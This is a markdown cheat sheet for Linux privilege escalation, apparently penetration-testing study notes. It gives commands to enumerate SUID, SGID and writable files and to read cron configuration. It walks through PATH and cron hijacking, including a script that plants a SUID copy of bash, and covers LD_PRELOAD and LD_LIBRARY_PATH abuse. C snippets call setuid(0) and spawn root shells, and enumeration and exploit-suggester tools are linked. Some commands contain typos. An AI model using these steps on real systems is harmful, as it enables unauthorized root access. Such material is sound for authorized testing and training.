- [Find](#Find)
- [Services_behind_firewall/localhost](#Services_behind_firewall/localhost)
- [PATH_Variable](#PATH_Variable)
- [SUID](#SUID)
- [Cronjob](#Cronjob)
- [Sudo](#Sudo)
- []()
- []()
- []()
- []()
- [Case_study_1](#case_study_1)
- [Tools](#Tools)
--------------------------------------------------------------------------------------------------------------------------------
# Find

### SUID
```
find / -perm -1000 -type d 2>/dev/null - Sticky bit
find / -perm -g=s -type f 2>/dev/null - SGID
find / -perm -u=s -type f 2>/dev/nul -SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null - SUID or SGID
```
### Find writable files
```
- find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print 
- find / -writable -type d 2>/dev/null
- find / -writable -type f 2>/dev/null
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Find writable by current user
```
find / perm /u=w -user whoami 2>/dev/null
find / -perm /u+w,g+w -f -user whoami 2>/dev/null
find / -perm /u+w -user whoami 2>/dev/null
```

### Find readable files
```
find / -perm -2 ! -type l -ls 2>/dev/null
```

### Find  writable folder
```
find / -perm -o x -type d 2>/dev/null
```

### Find Writable & Executable files
```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
--------------------------------------------------------------------------------------------------------------------------------
# Services_behind_firewall/localhost
```
netstat -ano
netstat -tulpn
```
--------------------------------------------------------------------------------------------------------------------------------
# PATH_Variable

#### Check the PATH
```
echo $PATH
```

#### case study one
- Binary file with SUID permission
  - check what the file do
  - for example *which linux commad use*
    - in our case we use *ps* command
- Create malicious file
  - echo "/bin/bash" or "/bin/sh" > /tmp/ps
  - chmod 777 /tmp/ps
  - *OR*
  - cp /bin/sh /tmp/ps
  - *OR*
  - ln -s /bin/sh /tmp/ps
    - export PATH=.:$PATH
- check PATH
  - echo $PATH
- change $PATH (add tmp folder)
  - export PATH=/tmp:$PATH
- run SUID binary
--------------------------------------------------------------------------------------------------------------------------------
# SUID
- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

#### Searching SUID file (SUID file is a special type of file permission given to a file
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
- find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
- find / -writable -type f 2>/dev/null>

### tip 'check suid/sgid files data'

#### Use strace for track suid file execute
```
strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve /suid/file/path 2>&1 | grep service
```
--------------------------------------------------------------------------------------------------------------------------------
# Cronjobs 
```
crontab -l
ls -alh /var/spool/cron
ls -alh /var/spool/crontabs
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root 
```

#### PATH Environment Variable
```
crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job
```
# SUDDO

### Useful commands
- Run program using sudo
  - sudo [program]
- Run porgram as specific user
  - sudo -u [username] [program]
- List programs a user allowed to run:
  - sudo -l

#### Other way to privileges
- sudo -s
- sudo -i 
- sudo /bin/bash
- sudo passwd

#### gtfobins
- https://gtfobins.github.io/

#### Environment Variables
##### Program run through sudo can inherit the environment variables from the user's environment
in sudowrs config file if env_reset option is set sudo will run programs in a new, miniml env
config options are display when running sudo -l

### LD_PRELOAD
is an environment variable can be set to path of shared object (.so) file
When  set, the shared object will be loaded before any others.
By creating a custom .so and creating init() function, we can execute code as soon as teh object is loaded

sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

LD_PRELOAD will no work if the real user id is defferent from the effective user ID


##### LD_LIBRARY_PATH: env variable contains a set of directories where shared libraries are searched for first

ldd command can be used to pritn the shared libraries
```
ldd /usr/sbin/apache2
```
by createing a shared library with the same name as one used by a program  and setting LD_library_path to its parent  the program will load our shared_library instead 


#### PATH Environment Variable case study
```
for PATH=/home/user
create file in /home/user
content: 
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 chmod +s file.sh
 
 wait: watch -n 1 ls -l /tmp
```

#### Wildcards
--------------------------------------------------------------------------------------------------------------------------------
# Case_study_1
### Create usefull C file
```
int main()
{
  setuid(0);
  system("/bin/bash -p");
}
```
```
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}
```
gcc -o [name] [filename.c]
--------------------------------------------------------------------------------------------------------------------------------
# Tools

### Run usefull script for linux enumeration
- ***Linenum***: https://github.com/rebootuser/LinEnum
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration
